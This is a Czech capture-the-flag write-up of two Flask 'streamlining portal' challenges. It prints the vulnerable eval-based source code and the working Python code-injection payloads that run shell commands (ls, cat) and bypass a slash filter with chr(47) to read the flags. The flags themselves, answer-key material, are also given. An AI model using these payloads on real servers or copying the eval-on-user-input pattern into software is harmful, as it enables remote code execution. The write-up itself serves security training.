# Streamlining portal

## Zadání

```
Hi, packet inspector,

the AI is preparing some kind of employee streamlining portal on http://user-info.mysterious-delivery.tcc. We fear this will lead to more lost packages.

Your task is to break into the web and find interesting information on the server.

May the Packet be with you!
```

## Řešení

### 1. Testy

* Stránka vypisuje `user`, což je zároveň součástí adresy vstupní stránky `http://user-info.mysterious-delivery.tcc/hello/user`
* http://user-info.mysterious-delivery.tcc/hello/test vypíše `Hello test`
* Nejedná se o SSTI (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) payloady `/{{7*7}}` a `/${7*7}` nezobrazí nic zajímavého
* `/"` - Internal Server Error (což je podezřelé)
* `/"+"a` - `Hello a`
* `/"+str(15)+"` - `Hello 15` (nejspíš se jedná o python)
* `/"+open(__file__).read()+"` - Zobrazení zdrojového kódu webové stránky:

```python
from flask import Flask, Blueprint, redirect, render_template

bp = Blueprint("app", __name__)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(bp, url_prefix="/")
    return app

@bp.route('/hello/<path:userstring>')
def hello(userstring):
    message = eval('"Hello ' + userstring + '"')
    return render_template('index.html', message=message)

@bp.route('/')
def redirect_to_user():
    return redirect("/hello/user", code=302)
```

### 2. Výpis vlajky

```
/"+__import__('os').popen('ls -lah').read()+"
```

```
total 28K
drw-r-xr-x 1 root root 4.0K Sep  9 09:19 .
drwxr-xr-x 1 root root 4.0K Sep  9 09:19 ..
drwxr-xr-x 1 root root 4.0K Sep 27 10:46 FLAG
drw-rw-rw- 2 root root 4.0K Sep  9 09:19 __pycache__
-rw-r-xr-x 1 root root  457 Sep  9 09:16 app.py
drwxr-xr-x 1 root root 4.0K Sep  9 09:16 templates
```

```
/"+__import__('os').popen('ls FLAG -lah').read()+"
```

```
total 16K
drwxr-xr-x 1 root root 4.0K Sep 27 10:46 .
drw-r-xr-x 1 root root 4.0K Sep  9 09:19 ..
-r--r--r-- 1 root root   26 Sep 27 10:46 flag.txt
```

```
/"+__import__('os').popen('cat FLAG/flag.txt').read()+"
```

## Vlajka

```
FLAG{OONU-Pm7V-BK3s-YftK}
```

# Streamlining portal NG

## Zadání

```
Hi, packet inspector,

the AI has detected your previous breach and has improved the security measures. New streamlining portal is on http://user-info-ng.mysterious-delivery.tcc.

Your task is to break into the improved web and find again interesting information on the server.

May the Packet be with you!
```

## Řešení

Zobrazení zdrojového kódu stránky:

```
/"+open(__file__).read()+"
```

```python
from flask import Flask, Blueprint, redirect, render_template, abort

bp = Blueprint("app", __name__)

def create_app():
    app = Flask(__name__)
    app.register_blueprint(bp, url_prefix="/")
    return app

@bp.route('/hello/<userstring>')
def hello(userstring):
    if 'cd ' in userstring:
        abort(403)
    message = eval('"Hello ' + userstring + '"')
    return render_template('index.html', message=message)

@bp.route('/')
def redirect_to_user():
    return redirect("/hello/user", code=302)
```

Drobná změna v route nám nedovolí použít znak `/`, ale ten můžeme nahradit například pomocí `chr(47)`:

```
/"+open('FLAG'+chr(47)+'flag.txt').read()+"
```

## Vlajka

```
FLAG{hvIM-3aty-R39h-dOZ4}
```
